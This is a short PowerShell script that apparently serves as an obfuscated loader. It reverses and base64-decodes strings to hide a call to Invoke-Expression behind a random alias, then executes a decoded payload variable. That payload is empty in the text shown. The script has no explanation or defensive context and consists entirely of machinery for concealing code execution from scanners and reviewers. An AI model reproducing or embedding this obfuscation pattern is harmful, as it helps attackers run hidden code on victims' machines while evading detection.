$31LFd5N7CDn8m0cyIRUr9 = "" ;
$TQ8Jur = $31LFd5N7CDn8m0cyIRUr9.ToCharArray() ; [array]::Reverse($TQ8Jur) ; $IZybmmCl8Yzz = -join $TQ8Jur ;
$uH = switch ($IZybmmCl8Yzz.Length % 4) { 0 { $IZybmmCl8Yzz }; 1 { $IZybmmCl8Yzz.Substring(0, $IZybmmCl8Yzz.Length - 1) }; 2 { $IZybmmCl8Yzz + ("=" * 2) }; 3 { $IZybmmCl8Yzz + "=" }} ;
$sWTUaFxR3N = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($uH)) ;
$1E52uNAoCrPw = '40bJN1UlJFU4VWLlt2TW5US'.ToCharArray() ; [array]::Reverse($1E52uNAoCrPw) ; $SlVhJWopfJ8t4Cdmj = -join $1E52uNAoCrPw ;
$SlVhJWopfJ8t4Cdmj = switch ($SlVhJWopfJ8t4Cdmj.Length % 4) { 0 { $SlVhJWopfJ8t4Cdmj }; 1 { $SlVhJWopfJ8t4Cdmj.Substring(0, $SlVhJWopfJ8t4Cdmj.Length - 1) }; 2 { $SlVhJWopfJ8t4Cdmj + '=' * 2 }; 3 { $SlVhJWopfJ8t4Cdmj + '=' } } ;
$WltXrzpE8FLMndcu6as = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($SlVhJWopfJ8t4Cdmj)) ;
$ecVr8WaY5v3BHvjAIzkS9oOYP = 'AOxpHd'.ToCharArray() ; [array]::Reverse($ecVr8WaY5v3BHvjAIzkS9oOYP) ; $XYcGk = -join $ecVr8WaY5v3BHvjAIzkS9oOYP ;
$XYcGk = switch ($XYcGk.Length % 4) { 0 { $XYcGk }; 1 { $XYcGk.Substring(0, $XYcGk.Length - 1) }; 2 { $XYcGk + '=' * 2 }; 3 { $XYcGk + '=' } } ;
$mZYPHJAg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($XYcGk)) ;
$NUll = neW-AlIas -NAmE $mZYPHJAg -VAlUe $WltXrzpE8FLMndcu6as -foRcE ; & $mZYPHJAg $sWTUaFxR3N ;

